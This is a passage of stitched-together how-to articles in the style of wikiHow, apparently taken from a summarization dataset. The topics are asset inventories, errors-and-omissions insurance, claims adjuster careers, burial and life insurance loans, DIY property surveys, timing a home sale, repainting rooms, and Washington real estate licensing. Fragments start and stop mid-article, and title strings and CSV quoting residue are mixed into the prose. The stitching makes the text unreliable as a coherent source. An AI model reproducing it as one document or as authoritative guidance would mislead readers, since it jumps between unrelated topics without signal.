, The location of items or important documents should also be listed in your personal asset inventory. For each of your physical assets, you should note the place that physical items are kept or stored along with special security required. For your financial accounts, you should identify them with the name, address, and phone number of the custodian, broker, or bank where the account is located.


Write down the name of the contact person responsible for accessing each of your accounts, the date the account was opened, and its current status.
The location of stock certificates, deeds, mortgages, certificate of deposits, and other evidence of an intangible asset should be clearly noted.
You should also list any person authorized to access the account and details required to have entry such as passwords, combinations of safes, or safety deposit keys., There may be some items in your inventory that need special attention or require certain actions to be maintained. Just like with other items, expensive jewelry, art, collectibles, and precious metals should be described fully in addition to estimates of current values. In addition to these descriptions, any intent to gift such items including names of beneficiaries, addresses, and conditions of transfer should be listed on your asset inventory., Once you have all of your physical and financial assets listed, listed all personal information, and attached copies of relevant documentation, you need to finish up your list. This includes adding any additional items that did not specifically fit into either of the categories but that you want listed. After you finish the last of the list, you should date your inventory.


This will help avoid confusion if your list is amended at a later time. A list without a date can be more confusing than not having the list.

, You should list the individuals that can help with your affairs if you are unable to. In the event of an emergency or in a time where you are unable to conduct your own affairs, you need to document the names, addresses, and contact information of your advisers or family members who have authority to act on your behalf.


You should notify these individuals that you have completed a personal asset inventory, where it is located, and any instructions regarding when and how to access the information., To keep your property safe, you should keep as many receipts as possible, especially on high ticket items. If you are using an electronic list, scan your receipts so you can have electronic copies of them. If you made a physical list, make photocopies of your receipts to keep with your list. It is always good to have multiple copies of them just in case something happens to either copy of the receipt.


You should scan or photocopy any other important documents that show your ownership of items, such as deeds of gifts or transfer of ownership forms.
You should store the electronic copies of your receipts on the same USB drive as your list. This way all of your documents stay together.
Keep the original receipts, even if you scan them. You may lose the files or need an original to prove the legitimacy of a purchase. Store them with other important documents.

, Once you complete your list, you need to keep it safe. You do this by making multiple copies of it and securing one in a safe location. If you did your inventory electronically, you should print a physical copy of the list and store it with other important papers in a fireproof safe or safety deposit box.Keep a second copy in a secure, but accessible place where you can easily change it if necessary.


You should also provide one copy to your attorney or the executor of your estate with instructions about when to access such information.
If your list is in electronic form, make two copies on separate flash drives that are secured by a password. Keep one of these flash drives and store the other safely.
If you used a notebook, you should make a copy of it and place the original in the safe or box. The other copy should be kept for you to easily access.

, Just because you made one list, your work is not over. You continually purchase things and change assets, so you need to keep your list up to date. Periodically review your list, adding new assets and deleting any assets no longer in your possession. If you acquire or dispose of a significant asset, amend the list as soon as possible following the event. You should note the details of the transaction, such as the date, parties involved, and your reasons for acquisition or disposal.


Destroy previous lists to avoid confusion, replacing the older list with the amended copy.

In the event the service turns out poorly somehow, to the point where a customer incurs a loss from the service, any damages or liability costs will be covered by E&O insurance. However, some industries are able to avoid the need for E&O by having standard contracts that prevent the customer from suing the service provider. Before relying on contracts, discuss with a lawyer whether or not this is possible in your industry and if it would make potential customers shy away from you., Some professions and businesses are more exposed to risk than others and must make sure that risk is covered in an E&O policy. In addition, for some professions, the potential cost of lawsuits is much higher. For example, a training specialist bears some risk, but not nearly as much as a heart surgeon. Think about your exposure to risk when deciding to buy E&O insurance and when choosing a policy. Make sure all of your risk is covered by the policy you choose.


It may also be possible that your industry is simply more likely to see claims filed against businesses. An insurance agent should be able to warn you about this issue if it affects your business., E&O is a policy specifically designed to protect you from honest business transactions that accidentally resulted in a financial loss for your customer. For liabilities outside this scope, you will have to get additional types of coverage (if available). For example, E&O insurance does not cover damaged properly or bodily harm on your business's property. This is instead covered by general liability insurance.


In addition, E&O insurance does not include claims filed by your own business associates. For example, if your law firms partners decided to sue you for failing to manage the firm properly, you would need directors and officers liability (D&O) insurance to cover your legal costs.
E&O insurance does not cover intentionally malicious, dishonest, or illegal acts., An insurance agent should be able to advise you on how coverage to get for your industry and specific business requirements. However, part of the reason you are buying insurance is for peace of mind. So, before buying insurance, consider other lawsuits you are aware of in your industry and what one against you might end up costing. Come up with a number so that you can negotiate a good coverage amount with your agent.


You should also consider the potential risk of any new services you plan to provide over the course of your insurance plan., There is no standard wording or generic E&O insurance coverage. Each company's E&O policy is specifically written to fit that particular company. It is important that the policy writer understands the area of your business in order to write the best policy. To get the best E&O policy, find an agent that specializes in your field. As you are presented with policy information, read over it thoroughly to make sure all the wording is correct., You're never going to be able to find a perfect insurance policy for your business if you don't negotiate the terms. Make sure to assess your individual needs and make sure that each one is covered specifically in the policy. If you need to, have a lawyer look over the contract with you to make sure your needs are represented. In many cases, additional coverages are available for little or no cost, so be sure to ask the insurance provider about anything you think the policy is missing., Some policies only cover claims made within the period of coverage. Other policies will cover claims made of allegations that occurred prior to the beginning date of coverage. These policies that cover you outside the dates of coverage can offer limited time coverage or protection for all prior acts. Under this type of policy, your business will be covered back to a ""retro"" or ""retroactive"" date.


This only covers you for services provided before buying insurance when the claims on those services are made after you have bought insurance.
In other words, you can't wait to buy insurance after the lawsuit has already been opened., Legal costs arising from a lawsuit can include judgments, settlements, and defense costs. Many E&O policies cover all of these costs, making the deductible on the policy the absolute limit to the expenses incurred by your business. However, some policies exclude defense expenses from the liability limit while others include them. Other policies may exclude punitive damages completely. Policies must be carefully examined to make sure that they cover these expenses., The best time to get insurance is when your business is first starting out. Dealing with even one customer puts you and your company in financial risk if something unplanned happens. If you are part of a company that has been fortunate enough not to have run into any problems like this yet and you do not have E&O insurance yet, it is not too late to get the insurance., You can usually buy insurance on your own, however you can usually get better coverage by hiring an experienced insurance broker. This broker will use their knowledge of your industry and the insurance market to locate you a comprehensive policy at the best price. If you are not able to locate an insurance broker for your industry online, try asking business associates or the office of an industry group relevant to your business., Contact your insurance company and begin the process of getting insurance. The insurance company will ask questions about your company and the services you provide. They will discuss with you the amount of coverage you would like to obtain. In the end, they will provide you with a price quote for you to have E&O insurance. Give the agent the best and most thorough information you can on your business to make him or her feel comfortable insuring you and giving you the best possible price quote.


The insurance provider may ask you for a variety of documents, including previous contracts, standard documentation procedures, training documents, or other business process-related documents. Be sure to have these ready if they are needed., Many industries have at least one specialized insurance provider that provides E&O insurance within that industry at a better price or with more comprehensive service than its competitors. Run a quick internet search and locate these insurance providers for your industry. Contact them about receiving an insurance quote. It's important to get several different quotes because prices may vary widely between providers.


A specialized provider will also be better equipped to protect you because they know your industry well.In many cases, professional or trade organizations can give you good rates on E&O insurance. Consider checking out these sources in addition to independent insurers., Compare each quote you have received, making sure first of all that each one has all of the required coverages that you need for your business. Then, look at the annual cost of each one and their claim cost structures. For many businesses, it may be best to get the policy with a lower annual fee and higher deductible.

The job can be high stress, but you won't be stuck behind a desk all the time.Also, know that in many parts of this field, you'll be dealing with emergencies and catastrophes. That means that at some point you will be dealing with people who are facing the death of a loved one or coworker, and you'll likely be witness to some of the aftermath.;
, A high school diploma or its equivalent is absolutely necessary to work in the insurance field as a claims adjuster. In fact, you can enter some insurance agency at the entry level with just this level of education. Nonetheless, moving on for more education will be helpful., A bachelor's degree or even an associate's degree can be helpful to you if you want to become a claims adjuster. The problem is, it's helpful to decide what part of the field you want to work in before deciding on a degree. The best option is to follow what you love. For instance, if you enjoy numbers and details, perhaps pursue a degree in accounting so you can work in the financial claims adjusting, a field where you assess losses due to problems in the company such as equipment loss or employees striking.Another option is getting an engineering degree, which can be helpful in assessing damage in the industrial fields.If the idea of extra school isn't your thing, consider getting a trade school degree in auto repair, as being able to assess the cost of a repair is something you could use in the claims adjuster insurance business., Mainly, claims adjusters are divided into two types, catastrophe and everyday claims. If you work as a catastrophe claim adjuster, you'll be the person on the ground after major weather events and emergencies, such as big tornadoes in Oklahoma or a hurricane hitting the coast. Because of the nature of these events, you may need to move around. Everyday claims adjusters focus on smaller events, such as car crashes, problems with homes, or claims made by companies., If you can, try to get an internship while you are still in school. You can often find internships through your school or by looking at some of the major insurance companies in your area. Often, you can take just a summer internship or one where you work a few hours a week. One of the best things about internships is you'll get on-the-job training for the career you want.Ask your school if you can earn credit for your internship.

, As a claims adjuster, you'll need a wide set of skills to help you in your day to day job. For instance, you'll need to be good in math, as you will be calculating the cost of damage. Focus on taking some math courses in high school and college so you'll be well prepared for that side of the job.Develop analytical skills, as well. As an adjuster, you need to be able to look at all the pieces of data available before deciding on an amount or before deciding whether a claim is fraudulent.Taking college courses, especially philosophy and English courses, can help you become more analytical. However, you can also develop these skills in your everyday life, by stepping back and analyzing the facts of a situation. For instance, when you are trying to make a decision about what car to buy, analyze all the details you have available to make your decision.
Focus on communication and interpersonal skills. In this job, you must talk to a wide range of people and then present the facts compelling about why you made the decision you did, usually in writing.Taking English classes and speech classes will help develop these skills, but so will working in retail and talking to people you meet out in the world to try to get to know them better.

, What is required for your license will vary by state. Therefore, check with your state's insurance board to find out what's required for a license in your state., Your state board will tell you who you need to schedule your exam with and what you will need to study for it. For instance, in Oklahoma, you take your exam with PSI Exams Online, at a cost of $20 to $40 in 2015, depending on what you take., Most states will have study material available to you so that you can study for your exam. You may also be able to find a class in your state that will help you prepare for the exam you are going to take. Which you chose depends on how disciplined you are in your studying., Passing the exam may be all your state requires for you to get licensed, which is how it is in Oklahoma.However, in other states, you may need to meet other requirements, such as having 2 years worth of experience in the field, as it is in California, before you can take the exam., Once you feel you are ready, take the exam. Most of the time, you can take the exam online once you register to take it.], Once you pass the exam, you can apply for your license. What the application requires also varies by state. However, you should receive notification of whether you received a license within a month., Most of the time, these licenses need to be renewed periodically. You may need to meet certain requirements before it is renewed, as well. For instance, in California, you must renew every 2 years, and in each set of 2 years, you must take 24 hours of continuing education, including an ethics course.Continuing education credits can be fulfilled in a number of ways. For instance, you can go the normal route and take classes and workshops. However, you can also write for big publications in your field or give a workshop or lecture yourself., When you enter the market, you'll need to decide whether you want to work as a staff member or an independent contractor. As a staff worker, you must show up for certain shifts every week, but the work will be steadier. As a contractor, you'll have more control over your time in some ways, but your work will likely be less steady. Also, you may be called at all hours of the day and night., You can find positions on major job websites, such as Monster, Yahoo!, or Indeed. However, you can also look on the websites for major insurance companies. Most companies have an area where they will list available jobs.

, If you've gained experience as an intern, use that to get your foot in the door. In fact, it's best to try at the company you worked at before, especially if you left a good impression. If you don't want to return there, you can use that experience to help you stand out from other candidates who are fresh out of school and who don't have the skills you do.

, As noted, certain skills transfer from job to job. For instance, if you've worked in retail, you likely have good interpersonal skills, so you can spin that in your interview. If you've worked as a cop or in security, you've likely done similar work to what you'll do as an adjuster; that is, you'll investigate a scene, looking for clues and talking to witnesses., You won't start out in the big leagues. In fact, you'll start off with small claims that won't cost the company so much if you make a mistake. In addition, you'll probably work under someone more experienced to learn the ropes., The best way to continue moving up the ladder is to do your job well. If you feel you can't do it very well yet, ask senior claims adjusters for advice, and don't be afraid to study in your own time so you can become better at what you're doing.

Meet with a funeral director.",How to Buy Burial Insurance1," Discuss the costs of a funeral and burial or research the details online. Funeral expenses vary greatly depending not only on the options you choose, but on location. They will also increase over time.


A traditional burial requires a casket, headstone, burial plot and concrete liner. If you want to allow a viewing, you will also need to consider the costs of embalming.
Cremation is less expensive than a traditional burial, requiring only an urn and the cost of conducting the cremation. You can choose to have your urn buried or placed in a vault, or you can direct that it be kept by family member.
Green burials are becoming popular in some parts of the country. Rather than using embalming and a casket to preserve your remains, a green burial is designed to allow your body to decompose. This allows you to return to the Earth and become food for plants growing nearby.;

Keep track of the loan.",How to Borrow From Your Life Insurance Policy," Not all life insurance policies allow you to borrow against them, so you need to find out the type of policy you own. The most common types of life insurance policies are:


Permanent life policies. These policies have a savings element along with the mortality coverage, and that is why you can borrow from them. This category can be broken down into:

Whole Life Insurance. You pay the same amount of premium for a specific period to receive the death benefit.
Universal Life Insurance (also known as ""adjustable life insurance""). You can reduce or increase your death benefit, and also pay your premiums at any time and in any amount (subject to certain limits) after you’ve made your first premium payment.
Variable Life Insurance. Most of your premium is invested in one or more separate investment accounts, such as stocks, bonds and mutual funds. The interest that your accounts earn increases your policy's cash value.
Variable Universal Life Insurance. Gives policyholders the option to invest, as well as easily change the insurance coverage amount.


Term Life Insurance. Pays the face amount of the policy at death, and only provides protection for a set term period (normally 30 years maximum). Does not build cash value.;
, Take a look at your policy to check if there’s a loan provision. You can also contact your agent for this information. For the most part, you can borrow against a permanent life insurance policy, since it has a cash surrender value.As for term life policies, these are not loan sources since they don’t have a cash value that can be borrowed.Only the owner of the permanent life insurance policy can borrow from it, not the insured or beneficiaries, unless they are also the owner.

, Check on your insurance company’s website or with your agent to find out the cash value of your policy. You can typically borrow up to the cash value you've accumulated in the account, but guidelines may differ from one company to the next.Note that cash value grows slowly at first, so you may have to own the policy for a while (sometimes as long as ten years) before you can borrow against it., There are several reasons a loan against your insurance policy may prove to be a better deal than a standard bank loan. Some of these are:


There’s no approval process, credit check, or income verification, since technically you’re borrowing against your own asset.
Insurance policy loans usually have much lower interest rates than bank loans.
You’re not limited as to how you can use the money. A bank might restrict how you can apply the loan proceeds, but an insurance policy loan has no such limitations.
There’s no required monthly loan payment, and there’s no payback date. The balance of the loan will be deducted from the death benefit that goes to your beneficiaries., Few things in life are risk-free. And taking a loan against your insurance policy is no exception. For example:


If you don't pay the interest on your loan, the insurance company will add that unpaid interest to your loan amount. This interest is subject to compounding. What that basically means is that in addition to paying interest on the actual loan amount, you’re paying interest on all the accumulated interest as well.
Dividends generated by the insurance policy will likely decrease as long as the loan is outstanding. Insurance dividends are basically a periodic return of your premiums. The dividend is based on the amount of your money available to be invested by the insurer. Taking the loan means that less of your money is available for investment, thus—lower dividends.In many cases, the cash value in your insurance policy is protected from creditors. However, once you withdraw money, the amount you take out is no longer sheltered.If the increasing amount of unpaid interest causes your loan balance to exceed your policy’s cash value, the insurance policy could lapse.To keep the policy from lapsing if your loan balance becomes greater than your policy’s cash value, you’d have to pay back the entire loan. You can’t pay it back in increments., The proceeds of the insurance policy loan are usually not taxable to you, as long as the loan amount is equal to or less than the total premiums you’ve paid. However, if the policy lapses, the IRS then considers your loan balance plus interest as taxable income for which you’re liable. This only occurs when the loan proceeds exceed the cash surrender value and it only applies to the difference., Your insurer can forward you the appropriate form for taking out the loan. You may also be able to download the form from the company’s website. Depending on your insurance company, you might be permitted to arrange for the loan by phone. For example, one insurer instructs its clients to call if the loan is for $25,000 or less., The information needed to properly complete the loan application depends on whether the owner is an individual, a business, or a trust. If it’s a trust (see definition here), you’ll need to know the date the trust was executed (signed). You’ll also have to provide the owner’s contact information, as well as a social security number (for an individual) or a tax ID (for a business or trust).You will need to be a trustee and have legal authority within the trust in order to make the transaction.

, The loan application will most likely ask how you want the proceeds distributed. Obviously this will depend on your purpose for taking out the loan. Usually you’ll have the choice of:


Having the proceeds paid by check (usually received in five to ten business days), or
Applying the loan amount to payment of future premiums. Sometimes people will do this if they don't have the money available to pay the premiums out-of-pocket, but they don't want their policy to lapse., Since you don’t have to make monthly loan payments, or pay back the loan within a certain time, it could be very easy to simply forget about it. That would be a mistake. Remember, your life insurance policy and the loan are financial investments. Here are some guidelines you might want to follow:


Monitor the loan balance regularly, in comparison to the cash value of the policy. You don’t want the loan to exceed the policy’s cash value, which could result in the policy lapsing.
Devise a disciplined loan repayment plan and make regular scheduled payments. Don’t forget that any amount of the loan remaining when you die means that much less money for your beneficiaries.
Pay the interest on the loan every year to prevent the loan from increasing."
"
Think of burial insurance as a life insurance policy that has the specific purpose of covering your final expenses.,
Consider the different payment options and what each options affords.",How to Buy Burial Insurance2," If you already have life insurance, part of the proceeds can be directed for use in covering your burial expenses or you can buy a separate policy that only covers these expenses.


Life insurance with a family member as beneficiary provides funds to the person who will plan the funeral and burial according to your wishes. You will need to discuss your wishes with that family member.
Life insurance with a funeral director as a beneficiary allows the funeral director to use the policy's proceeds for your funeral and burial. You will make arrangements with the funeral director to provide the services you want.

,


A policy purchased with a lump sum payment will provide the full value of the policy immediately--your beneficiary will have all the funds needed to provide the funeral and burial you want even if you die the day after paying for the policy. You may only be offered a policy with a lump sum payment if you're older.
A graded benefit policy will provide a certain amount of the face value depending on how many payments you have made. For example, if you choose a policy that will be paid for in 5 years, your beneficiary will only receive all the funds after 5 years; if you die before then, your beneficiary will only receive part of the funds and will have to pay the difference or choose cheaper options.
A traditional policy will provide full coverage immediately as long as you make the payments, but will be canceled if you stop paying.

Repeat for the other corners.",How to Conduct a Property Survey," The primary purpose of conducting a property survey is to prevent disputes about property lines. A neighbor's fence or buildings could be on your property, or vice versa, without your knowing about it. Surveys are often performed prior to the sale of a property, the beginning of construction on a building or fence, or when a property is being subdivided for sale. In essence, a property survey gives you the ability to know exactly where your property legally ends and the adjacent property begins.Only professionally-done property surveys are legally-binding.;
, In many cases, and especially for rural properties, it may be the case that existing boundaries are not the real, legal boundaries of a property. You and your neighbor may have a fence or a natural boundary, like a ditch or creek, dividing your land. However, your deed may specify another line that must be used when determining the actual boundaries of properties., Land surveying is a relatively difficult and time-consuming task, so expect to pay between $350 and $500, if not more, if you choose to have your land professionally surveyed.If you don't want to pay for this, you can survey the land yourself. However, keep in mind that doing so will not provide you with the same benefits of a professional survey.


An amateur survey cannot be used in court, as part of bank-required information in a property sale, or as a way to move existing property markers to make them more accurate.
An amateur survey can be used to get an educated approximation of your boundary line and may help you in property disputes of a non-legal nature (like your neighbor claiming that you're building a fence on his land).Professional surveyors can also provide you with information that would have a hard time getting on your own, such as gaps or overlaps with neighboring properties; easements; right-of-ways; your ownership of water features; relationships with the neighboring property (overhangs, encroachments, etc.); public infrastructure or utility rights; access points; and zoning issues., Performing a property survey by yourself can be a more cost-effective way to go, but can potentially get you in trouble. If you're off by even a small margin and build something on a neighboring property, your neighbor can take you to court, which could end up costing you thousands. Consider the costs of making a mistake before deciding not to spend a couple of hundred dollars to have your land professionally surveyed.If you do hire a professional, make sure that they are licensed, insured, and have years of experience., In order to determine where your legal boundaries are located, you will need at least one legal document describing your land. The deed to the land should have a section called ""legal description"" that describes the boundaries and the relationships between them. Another useful document is the surveyor's map of your land, also called a plat. Unlike your deed, the plat will show an actual map of the borders of your property and surrounding areas.


Locating a plat for your land may be difficult or impossible. Sometimes they are included with the deed. Other times they may be present in your city or county's records. Check with your town or county hall to check if these records exist there.
If you can't locate a plat, try locating those for surrounding properties. This can help you identify shared boundaries.A previous survey map can be unreliable, especially if it is very old. Keep in mind also that not all land has been surveyed., The plat should be fairly easy to understand, as it shows the location of boundary lines and markers, and sometimes has other helpful information like coordinates or triangulation information. However, the legal description on the deed will be written in more confusing language and will use one of two systems for describing boundary lines: metes and bounds or the public land survey system (PLSS).


Metes and bounds is a system that uses a bearing (or direction) and length (or distance) between points to describe the property. Bearings are described using a specific notation that converts compass azimuth (the degree markings on a compass) to bearing notation. This means adding a number (0 for NE, 90 for SE, 180 for SW, or 270 for NW) to the listed measurement to find the matching compass azimuth.

For example, the description might list a starting point, then a next marker 200 feet to S50W from that point. This means that the next marker is 200 feet away and roughly to the southwest. S50W would be 230 degrees (50 +180) using the azimuth system (or almost exactly due southwest).


Alternately, your land may be described by the original boundaries of the PLSS. This nearly 200-year old system split up land into 640-acre sections. It then split those sections into quarters, and those quarters into further quarters, and so on. Sections are numbered and then parts of those sections are described with fractions.

For example, the NW 1/4 of the NW 1/4 of Section 4 would be the top, left-most 1/16th of Section 4.The following website provides a useful service that may help you locate your property using PLSS data: http://www.esg.montana.edu/gl/trs-data.html.



, You will need a method of ensuring that you are correctly following the heading towards the next marker and effectively measuring your progress. Most surveyors choose to use a compass and a very long tape measure for this purpose. You should also make sure to bring your maps and documents with you. Finally, bring a method of marking your property markers, such as brightly-colored flags or posts.

, To start, you'll need a starting point. Legal descriptions usually specify a starting point to measure from, which can be anything. For example, it may say ""50 feet SW of the road"" or could start at a tree or rock feature. This point can be located on your property by searching the described location for a marker. Alternately, you can use the PLSS coordinates and maps to locate a starting corner.


Google Maps and USGS topography maps are both free, online sources for maps that may help you locate a starting corner. Through these services, you can obtain a virtual copy of an aerial map for free. You may have to zoom in or out to distinguish boundary lines.
The known corner may also be a neighbor's marker or road intersection. However, don't count on using markets like trees, fences, or rocks, as they may have been moved over the years., Grab your supplies and copies of your maps and head out to the property. Search the corner you discovered through your research for an existing property marker. If there isn't an existing marker, mark the corner yourself to the best of your ability with the information that you have.


When locating survey monuments, be sure to be skeptical of whether or not the objects you find are actual monuments or just junk on your land. Unless they match up perfectly with your map or deed's description, they may not be what you are looking for.
If you are unsure about the location or existence of such a monument, hire a professional surveyor., Start at your corner and move your compass to find the bearing to the next marker. Plant your tape measure at the first corner and start walking, maintaining your compass heading. It may help to identify a landmark in that direction first, so that you know that you are staying on course. When measuring distance, know that the described distance is not in relation the topography of the land. That is, the distance is the horizontal distance only, not over obstruction or hills. Determining this actual distance may require you to find a way to keep your tape measure exactly level while measuring.


If you cannot pass a certain area directly, move exactly perpendicular to your bearing until you can pass the obstruction, move forward towards the marker, then move back on course when you can by moving perpendicularly in the opposite direction., When you think you've reached the next corner, search for the described marker. If you can't find it, it may be buried or missing. Try using a metal detector to locate if it is supposed to be a metal rod or spike. You can also use your compass as a metal detector by holding it very close to the ground near where you think a metal marker might be. When it points downward towards the ground and spins, you've located something metallic underground, which might be your marker.


Markers can be anything. Modern markers are metal rods or poles, but old markets can be glass shards, etched rocks, wooden stakes, piles of charcoal, or anything else.
Some markers may be impossible to locate accurately. Try locating the next corner if you can't find one. Locating the two neighboring corners can help you identify a missing one., Mark the corner you've just found. Approximate it if you didn't find an existing marker. Then, repeat for the other corners of the property, making sure to mark each corner along the way. You may also choose the mark the property line regularly as you go. This can help you retrace your path at a later date if needed. After this process, you will hopefully arrive back at your starting point with a completely marked plot of land behind you. If not, you'll have to retrace your steps to identify what went wrong.

Sell in the spring.While you can choose to sell your home at any time of the year, spring is the most popular time to sell a home because it is the time that the most buyers are looking.More buyers are in the market for new homes during the spring because they have received their tax rebate checks and can now better afford the down payment and other costs associated with buying a home.In addition, the days are longer, meaning that there is more time for showing your house to potential buyers.It also seems that more home sales during the spring months in particular occur at full asking price.,
Consider selling in autumn.,
Avoid the summer months.If you want to sell your home at or near asking price, you will need a buyer willing to pay.,
Steer clear of the holiday season.,
Consider recent sales prices of comparable homes.,
Pay attention to inventory.,
Know your area.,
Accentuate unique or desirable features.,
Consider the condition of your home.,
Sell when the weather is best.,
Use tax incentives as cues.",How to Choose the Best Time of Year to Sell Your Home," This can be reason enough to choose to sell in the spring if possible.;
, If you can’t sell in the spring, consider the autumn. There are no major holidays to contend with, and depending on your region of the country, you may still be experiencing relatively mild weather., Many of these folks will be vacationing during the summer months, so this is not the best time of year to list your home for sale.

, People are highly unlikely to be browsing for new properties during this busy time.This makes it more likely that your house will stay listed longer, which will make it more unattractive to potential buyers.

, You may want to hire a realtor in order to assist you with selling your home successfully by listing it at the right time. Your realtor will be able to find out about current market conditions to estimate an accurate listing price and can also provide you details about how long it might take for your home to sell.This may affect the time of year that you choose to list and sell your house.


If possible, sell your home at the time of year (this may vary regionally) when prices of comparative homes are high. This will ensure that you get the best possible price on your house. You can either consult your real estate agent to find out this information, or you can look online at websites that people commonly use to list their houses for sale.

, Working with a real estate agent to understand the inventory of houses in your market can affect when you want to list your home. This factor will change from year to year, but it will be best to list your home when the inventory of homes is on the lower side.

, Various factors in the area surrounding your home can influence when is best to sell your home. Consider, for example, if you have a highly sought-after elementary school in your area. If this is the case, families may be looking to move in time for the beginning of the school year. You should then make sure your home is available several months before the start date of school so that there is ample time for viewing and moving.


If you live in an area with temperate climate and fewer buyers with children, it is possible that you will experience more balanced buying seasons.In short, this means that there is no time of year that is necessarily best for selling your home.

, Do you have a particular feature in your home or on your property that you think would be particularly desirable to potential buyers? For example, do you have a beautiful in-ground swimming pool that looks dazzling during the summer or a huge oak tree that looks beautiful in the autumn? If so, attempt to sell your home at a time when these features are at their finest.


Accentuating your unique or desirable features at the right time of year will help you especially if you are holding open houses to advertise your property.

, Before you sell your home, you will need an ample amount of time to make improvements, deep-clean your home, and clear away any unnecessary clutter.You may also want to consider doing some work your yard and the area surrounding your home. You should only sell your home once these essential tasks have been completed to make your property as attractive as possible to potential buyers. The best time to sell your home is when it is in its best condition.


Expect buyers to have high expectations of your home’s condition. You are more likely to successfully sell your home at or near asking price if your home is in prime condition when you list it.

, Rain and other less-pleasant weather can deter home buyers from actually going to look at homes. Pleasant weather encourages more home buyers to go out and look at open houses and tour homes that are for sale. Sunshine is great for getting people into a good mood, and clear skies can improve the appearance of your property and create more positive reactions to your home.


The weather varies greatly region to region. Consider selling your home when the temperatures in your area are pleasant and you have a higher percentage of sunny days.

, Look for incentives in your area as cues to when to list your home. For example, if there is a rebate for first time homebuyers being offered (or some other sort of incentive that will be ending at a particular time), you should list your home prior to the end of these incentives.


Buyers may be looking to buy before the April 15th tax deadline. Keep that date in mind when listing your home.

Go to a home improvement store and buy mini paint jars to test on your home or free paint chips. Paint a 30cm x 30cm (about 1ft x 1ft) swath on a wall in the room(s) you want to repaint in your top 3 or 4 colours. Leave them up for at least 5 days.;
, Now that you have lived with those colors for a few days, it is time to choose. Be sure to avoid giving every room the same colour, or the rooms appear plain and boring. Your decision should be based not off of what you like, but what the average buyer would like. Consider having friends and/or family over for their input.

, Decide who paints the room. If you don`t want to deal with painting, hire a professional. If you want to do the painting yourself and save some money, read on.

, Carefully take off light switch plates, outlet and cable covers, et cetera. Take down blinds and curtains. Remove mold, see Remove Mold from Drywall for help.


Use this time to rectify bumps or divots on the wall, smooth or add texture (see Texture Walls) and dust the wall to allow smoother application. Put down a 'drip cloth,' a impermeable cloth that goes on the floor to protect it from paint. Use painter's tape to hold the cloth against the wall. See Prepare a Room for Painting for more help.

, If the current paint colour is lighter than the old and will go over designs (i.e., stripes, dots, et cetera), a different base (oil, acrylic, water) than the old, is a different finish (gloss, semi-gloss, matte), is 'modified' with markers or pens, or if the wall you are painting on is not drywall, you should put down a few coats of primer.


Primer covers up old paint, allows different bases and finishes to be applied. Primer will also cover up modifications and allow paint to stick to non-drywall surfaces. Primer is applied just like paint. Do at least three layers or until you can no longer see any trace of the old surface. See Paint a Room for more help.

, Now, the show can start! Make sure that your drip cloth is secure and ready for action.


For an even paint job and quick application, get a paint tray and a large roller brush with metre (yard) long handle. Roughly pour a tenth of the paint bucket into the tray, roll the brush in it, push the brush against the tray to remove excess, and apply.
The application should be done in a '|\|\|' pattern, going up and down diagonally to cover everything. Then, you can back up and continue this way. For corners, the top and the bottom of the wall, use a small brush to apply paint. As with every job, there are multiple ways to do this, see Paint a Room for tips and advice.

, Now that the first layer has been applied, let it dry. This is a good time to take a break, paint a different room or buy something that you forgot earlier and now desperately need.

, Be sure to take occasional breaks to get fresh (aka non-paint-fume) air. If weather permitting, open doors or windows to get some fresher air inside.

, You are almost done! After the walls are completely dried, remove the drip cloth and dispose.


Paint brushes and trays can be cleaned and reused (see Clean a Paintbrush) or disposed of. Remove all paint from yourself so that you do not get paint on your belongings. Carefully re-affix light switch plates, outlet and cable covers, et cetera. Put blinds and curtains back up, basically return the room back to normal.

, Do this just in case you spill tea on your wall or scuff the paint. But paint must be stored in a certain way lest it spill or release dangerous fumes.


The paint cans should be kept outside or in a non-occupied room (i.e., garage, closed, laundry room) and not in a bedroom, restroom, et cetera. The fumes released can make people light headed over time and the cans can be spilled.

If you cannot store it safely, do not throw it away! Paint must be disposed of specially. Contact your city (or entitative) government for guidance.

Before you begin undergoing the necessary training, make sure you meet the basic requirements. In Washington, in order to be a real estate agent you must:


Be at least 18 years of age
Have at least a high school diploma or the equivalent, such as a GED;
, You will have to engage in nearly two years of education to get your real estate license in Washington. Use that time to your advantage to gain experience in the field. While not directly related to obtaining your license, certain experiences are invaluable to your success as an agent.


Try to get an internship or office job in a real estate firm. Even an administrative position that seems only tangentially related to buying and selling houses can teach you hard work and give you a sense of what the industry is like. Not to mention, if you make a good impression on someone in the industry you could snag a job after you get you license.
Ask an experienced real estate agent if you can shadow them for a day or week to see what the industry is like just to make sure this career path is really for you.

, In Washington, there are specific educational requirements you must complete before taking the real estate exam.


Make sure the courses you enroll in are approved by the Washington State Department of Licensing. If you're unsure if a class is approved, give the Department of Licensing a call during office hours just to be sure. You don't want to invest time and money in a course that won't be accepted when you apply to take the exam. A list of approved curriculum is found on the Washington Department of Licensing website, as well as some approved schools.Classes are available online, through colleges such as Kaplan, and in-person at universities and community colleges. Find a route that works for you and enroll. Fees vary from program to program, but tuition can cost as much as $300. Be prepared to spend some money during the process of obtaining your license., You must complete 90 total hours of coursework within a 2-year time frame. These courses are extensive and demanding, so be prepared to commit.


Your 90 hours include a 60-hour course in real estate fundamentals. This course is an overview of the real estate trade. You will learn about various real estate firms and what they do in communities. You will learn about policies like contract laws, fair housing laws, property ownership rights, and listing agreements. There's also an extensive overview of the buying and selling process, and a good deal of basic real estate vocabulary you must commit to memory.The additional 30 hours are comprised of a course in real estate practices. Here, you will learn about basic business skills and procedures in the real estate world. You will learn how to evaluate, price, and market property as well as a variety of negotiation and sales techniques. You will also learn about the closing process and how to conduct real estate math., The state exam is hard. Knowing the information and having completed the necessary coursework does not guarantee you will pass. The structure of the questions and specific vocabulary can throw even the most well-researched test taker. Exam prep, whether through software or a test prep class, can help you get a passing score on the real estate exam.


Free practice exams are available online, but are not subject to as rigorous review as paid courses and prep work.
Online universities offer test prep courses for a variety of state real estate exams, including Washington.
Self-guided exam prep guides are available for purchase online, which include information on the format of the test, information you'll need to know, and a variety of practice exams.You can purchase exam prep books, either on Amazon or from a local bookstore, that help with real estate test prep. However, make sure you get the most recent edition as real estate exams are subject to change. Going to a used bookstore is not the best option if you're going the book route, as you're likely to find a dated exam guide.

, In Washington, you have to register as a student with a testing vendor before completing your coursework. This is so your school can submit your course completion information electronically and let the testing vendor know you've met all the basic requirements to take the real estate exam.

Fees and hours of operation vary from agency to agency. Make sure you know how much fingerprinting will cost as you'll be required to pay at the station.You must include your completed fingerprint card with the application you will fill out.

